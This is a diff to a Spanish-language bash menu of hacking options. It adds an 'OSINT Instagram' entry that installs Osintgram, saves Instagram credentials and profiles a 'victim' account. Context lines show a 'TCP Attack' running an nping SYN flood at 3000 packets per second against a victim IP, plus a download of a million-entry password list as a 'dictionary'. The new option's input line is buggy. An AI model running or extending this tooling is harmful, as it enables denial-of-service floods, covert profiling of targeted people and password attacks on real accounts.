@@ -13,10 +13,9 @@ do
       echo "|----------------------------------------------------------|";
       echo "|                         OPCIONES                         |";
       echo "|----------------------------------------------------------|";
-      echo "| 30 - Salir                                               |";
+      echo "| 30 - Salir                                               |";    
       echo "|----------------------------------------------------------|";
-      echo "|                     54.165.72.80                         |";
-      echo "|----------------------------------------------------------|";
+      echo "| 21 - OSINT Instagram                                     |";
       echo "|----------------------------------------------------------|";
       echo "| 20 - TCP Attack                                          |";
       echo "| 19 - UDP Attack                                          |";
@@ -84,7 +83,20 @@ do
         python3 -m pip install -r sherlock/requirements.txt
         wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
         mv 10-million-password-list-top-1000000.txt diccionario.txt
-        
+	sleep 2
+	git clone https://github.com/Datalux/Osintgram.git
+	cd Osintgram/config/
+	rm credentials.ini
+	read -p "Dime el usuario: " usrr
+	read -p "Dime la contraseña" pwww
+	touch credentials.ini
+	echo "[Credentials]" >> credentials.ini
+	echo "username = $usrr" >> credentials.ini
+	echo "password = $pwww" >> credentials.ini
+	cd ..
+	cd ..
+
+
         ;;
         1)
         clear
@@ -209,6 +221,11 @@ do
         20)
         read -p "Dime la ip de la Víctima: "  ip
         nping --tcp --flags syn --rate 3000 -c 100000 $ip
+	;;
+	21)
+	cd Osintgram/
+	read -p "Dime el usuario de la victima" $urs
+        python3 main.py $urs
 	;;
         30)
                 exit
